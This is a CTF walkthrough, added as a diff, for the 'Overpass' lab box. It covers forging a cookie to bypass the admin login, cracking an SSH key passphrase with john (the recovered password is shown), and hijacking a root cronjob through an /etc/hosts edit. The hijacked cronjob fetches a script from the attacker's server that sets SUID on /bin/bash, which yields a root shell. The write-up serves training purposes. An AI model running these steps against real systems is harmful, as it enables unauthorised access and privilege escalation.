@@ -1,0 +1,85 @@
+This challenge is quite interesting, first of all I scan all the port with nmap and found 
+port 22 and port 80 is open.
+
+opened the site its running on port 80, while enumerating I found a download page where i got to see some precompiled binary files. we will figure it out.
+
+Then I performed a dir search with gobuster and found a admin login page.
+while enumerating its background code a if else login script is running to check its sesionToken
+----------------------------------------------------------------------------------------------------            
+            async function login() {                                                                |
+              const usernameBox = document.querySelector("#username");                              |
+              const passwordBox = document.querySelector("#password");                              |
+              const loginStatus = document.querySelector("#loginStatus");                           |
+              loginStatus.textContent = ""                                                          |
+              const creds = { username: usernameBox.value, password: passwordBox.value }            |
+              const response = await postData("/api/login", creds)                                  |
+              const statusOrCookie = await response.text()                                          |
+              if (statusOrCookie === "Incorrect credentials") {                                     |
+                  loginStatus.textContent = "Incorrect Credentials"                                 |
+                  passwordBox.value=""                                                              |
+              } else {                                                                              |
+                  Cookies.set("SessionToken",statusOrCookie)                                        |
+                  window.location = "/admin"                                                        |
+              }                                                                                     |
+          }                                                                                         |
+                                                                                                    |
+-----------------------------------------------------------------------------------------------------
+
+Here in this code it checking if the response is equal to “Incorrect Crentials”, If true, it will display a message saying “Incorrect Credentials”.Otherwise, it will set a cookie named “SessionToken” to the returned statusOrCookie and redirect the user to /admin. Since this is only checking for a cookie named SessionToken let’s just create a cookie and give it a bogus value.
+
+I used browser developer option to create a bogus session cookie for the site:
+
+Name                Value   Domain          Path    
+SessionToken        value   ip_address      /
+
+and reload the admin login page it will result a SSH key for user James. 
+Then I cracked the SSH with the help of ssh2john and john.
+---------------------------------------------------------------------------------------------
+john --wordlist=/opt/rockyou.txt id_rsa_hash                                                 |
+Using default input encoding: UTF-8                                                          |
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])                   |
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes           |
+Cost 2 (iteration count) is 1 for all loaded hashes                                          |
+Will run 4 OpenMP threads                                                                    |
+Note: This format may emit false positives, so it will keep trying even after                |
+finding a possible candidate.                                                                |
+Press 'q' or Ctrl-C to abort, almost any other key for status                                |
+james13          (id_rsa)                                                                    |
+Warning: Only 1 candidate left, minimum 4 needed for performance.                            |
+1g 0:00:00:10 DONE (2020-09-17 09:45) 0.09606g/s 1377Kp/s 1377Kc/s 1377KC/s *7¡Vamos!        |
+Session completed                                                                            |
+---------------------------------------------------------------------------------------------|
+
+I tried to ssh into the box using the id_rsa hash and with the creds for james.
+
+After into the box found a todo.txt file.
+
+    To Do:
+      > Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+      > Write down my password somewhere on a sticky note so that I don't forget it.
+        Wait, we make a password manager. Why don't I just use that?
+      > Test Overpass for macOS, it builds fine but I'm not sure it actually works
+      > Ask Paradox how he got the automated build script working and where the builds go.
+        They're not updating on the website
+I used linpeas.sh, to find some missconfig on the machine. I found a cronjon is running which execute a script every one minute.
+
+/downloads/src/buildscript.sh
+
+so, I took advantage of this cronjob. I edited the ip table /etc/hosts and added my tun0 ip address with the hostname overpass.thm. Then I created the same structure on my /var/www/html--> download/src/buildscript.sh. added chmod +s /bin/bash. So what it does is when ever the cron job is running with root privilege it execute the file from our machine and changes the user/group as which you "execute" the file.
+
+            sudo python3 -m http.server 80
+            Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+            10.*.*.**5 - - [17/Sep/2020 13:36:04] "GET /downloads/src/buildscript.sh HTTP/1.1" 200
+
+So, for that I started local server with port 80 on my machine, so when the cronjob runs it executes the command from our machine.
+
+while you waiting for the cronjob to be run, you can fire up the command " watch ls -al /bin/bash" you will see changes of the file permission. 
+
+You will find dsrwxr-xr-x  this on /bin/bash file perm.
+
+Now you can run /bin/bash -p to root get shell on the machine.
+
+
+
+
+
